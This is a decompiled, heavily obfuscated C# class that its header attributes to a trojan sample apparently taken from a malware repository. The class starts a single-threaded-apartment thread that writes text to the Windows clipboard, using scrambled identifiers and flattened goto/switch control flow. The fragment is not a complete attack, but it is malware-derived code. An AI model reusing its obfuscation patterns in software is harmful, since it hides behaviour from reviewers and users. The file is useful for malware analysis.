// Decompiled with JetBrains decompiler
// Type: @ԇ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

internal sealed class \u0040ԇ : \u0040Ӡ
{
  private readonly object \u0040ӓ;
  private readonly int \u0040Ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string \u00387u() => (string) this.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int \u0033zY() => this.\u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040ԇ(string _param1, string _param2, \u0040Ԫ _param3)
  {
    int num1;
    if (!\u0040ԇ.\u0040Ӝ())
    {
      if (true)
      {
        num1 = 3;
        goto label_6;
      }
    }
    else
      goto label_3;
label_2:
    \u0040ԇ.\u0040ӓ ӓ = new \u0040ԇ.\u0040ӓ();
    goto label_5;
label_3:
    num1 = 5;
    goto label_6;
label_4:
    \u0040ԇ.\u0040Ӗ((object) this);
    num1 = 6;
    goto label_6;
label_5:
    ӓ.\u0040ӓ = (object) _param2;
    goto label_4;
label_6:
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 3:
          \u0040ԇ.\u0040ӕ();
          if (true)
          {
            num1 = 1;
            continue;
          }
          goto label_9;
        case 1:
          goto label_2;
        case 2:
        case 5:
          goto label_5;
        case 4:
          goto label_4;
        case 6:
          goto label_9;
        default:
          num1 = 4;
          continue;
      }
    }
label_9:
    try
    {
      Thread thread = new Thread(new ThreadStart(ӓ.\u0040Ӕ));
      \u0040ԇ.\u0040Ӝ();
      int num2 = !\u0040ԇ.\u0040ӛ() ? 3 : 5;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            \u0040ԇ.\u0040ӗ((object) thread, ApartmentState.STA);
            num2 = 4;
            continue;
          case 1:
            this.\u0040Ӕ = 0;
            if (true)
            {
              num2 = 6;
              continue;
            }
            goto label_17;
          case 4:
            \u0040ԇ.\u0040Ә((object) thread);
            goto default;
          case 6:
            goto label_15;
          default:
            \u0040ԇ.\u0040ә((object) thread);
            if (true)
            {
              num2 = 1;
              continue;
            }
            goto case 4;
        }
      }
label_15:
      return;
label_17:;
    }
    catch (Exception ex)
    {
      this.\u0040ӓ = \u0040ԇ.\u0040Ӛ((object) ex);
      this.\u0040Ӕ = 1;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӗ(object _param0, ApartmentState _param1) => ((Thread) _param0).SetApartmentState(_param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ә(object _param0) => ((Thread) _param0).Start();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ә(object _param0) => ((Thread) _param0).Join();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӛ(object _param0) => (object) ((Exception) _param0).Message;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӛ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӝ() => false;

  private sealed class \u0040ӓ
  {
    public object \u0040ӓ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0040ӓ()
    {
      \u0040ԇ.\u0040ӓ.\u0040ӕ();
      \u0040ԇ.\u0040ӓ.\u0040Ӗ((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040Ӕ() => \u0040ԇ.\u0040ӓ.\u0040ә(this.\u0040ӓ);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ӗ() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ә() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ә(object _param0) => Clipboard.SetText((string) _param0);
  }
}
